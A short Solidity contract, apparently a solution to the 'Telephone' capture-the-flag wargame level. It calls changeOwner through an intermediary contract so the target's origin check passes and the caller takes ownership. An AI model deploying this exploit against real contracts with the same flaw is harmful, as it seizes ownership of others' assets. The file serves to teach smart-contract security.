// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    ITelephone public telephoneContract;

    constructor(address _telephoneAddress) {
        telephoneContract = ITelephone(_telephoneAddress);
    }

    function attack(address _newOwner) public {
        // Call the changeOwner function on the Telephone contract
        telephoneContract.changeOwner(_newOwner);
    }
}
